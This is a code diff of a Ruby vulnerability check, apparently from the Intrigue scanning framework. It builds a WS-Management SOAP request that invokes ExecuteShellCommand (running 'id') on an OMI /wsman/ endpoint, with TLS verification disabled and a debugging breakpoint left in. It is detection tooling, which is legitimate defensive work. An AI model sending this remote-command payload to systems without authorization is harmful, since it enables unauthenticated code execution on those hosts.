@@ -45,50 +45,61 @@ module Intrigue
 
         def check
           # get enriched entity
-          url = "#{_get_entity_name}"
+          url = _get_entity_name
+          hostname = URI.parse(url).host
+          port = URI.parse(url).port
           
           headers={
                 "Content-Type": "application/soap+xml",
           }
 
           body = <<-EXPLOIT
-          <s:Envelope
-            xmlns:s="http://www.w3.org/2003/05/soap-envelope"
-            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
-            xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
-            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
-            xmlns:xsi="http://www.w3.org/2001/XMLSchema"
-            xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
-            xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
-          <s:Header>
-            <a:To>#{url}/wsman/</a:To>
-            <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
-            <a:ReplyTo>
-              <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
-            </a:ReplyTo>
-            <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
-            <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
-            <a:MessageID>uuid:{uuid}</a:MessageID>
-            <w:OperationTimeout>PT1M30S</w:OperationTimeout>
-            <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
-            <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
-            <w:OptionSet s:mustUnderstand="true"/>
-            <w:SelectorSet>
-              <w:Selector Name="__cimnamespace">root/scx</w:Selector>
-            </w:SelectorSet>
-          </s:Header>
-          <s:Body>
-            <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
-              <p:command>id</p:command>
-              <p:timeout>0</p:timeout>
-            </p:ExecuteShellCommand_INPUT>
-          </s:Body>
-          </s:Envelope>
-          EXPLOIT
+<s:Envelope
+  xmlns:s="http://www.w3.org/2003/05/soap-envelope"
+  xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
+  xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
+  xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema"
+  xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
+  xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
+  >
+<s:Header>
+  <a:To>HTTP://#{hostname}:#{port}/wsman/</a:To>
+  <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
+  <a:ReplyTo>
+    <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
+  </a:ReplyTo>
+  <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
+  <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
+  <a:MessageID>uuid:8c2f6345-65b9-47fd-9d14-647b537a0e83</a:MessageID>
+  <w:OperationTimeout>PT1M30S</w:OperationTimeout>
+  <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
+  <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
+  <w:OptionSet s:mustUnderstand="true"/>
+  <w:SelectorSet>
+    <w:Selector Name="__cimnamespace">root/scx</w:Selector>
+  </w:SelectorSet>
+</s:Header>
+<s:Body>
+  <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
+    <p:command>id</p:command>
+    <p:timeout>0</p:timeout>
+  </p:ExecuteShellCommand_INPUT>
+</s:Body>
+</s:Envelope>
+EXPLOIT
 
-          res = http_request :post , url, nil, headers, body, true, 60
+          #res = http_request :post , url, nil, headers, body, true, 60
+          r = Typhoeus::Request.new(
+          url,
+          method: :post,
+          body: body,
+          headers: headers,
+          ssl_verifyhost: 0,
+          ssl_verifypeer: false
+        ).run
 
-          _log "Got response #{res}"
+          _log "Got response #{r}"
           require 'pry'; binding.pry
         end
 
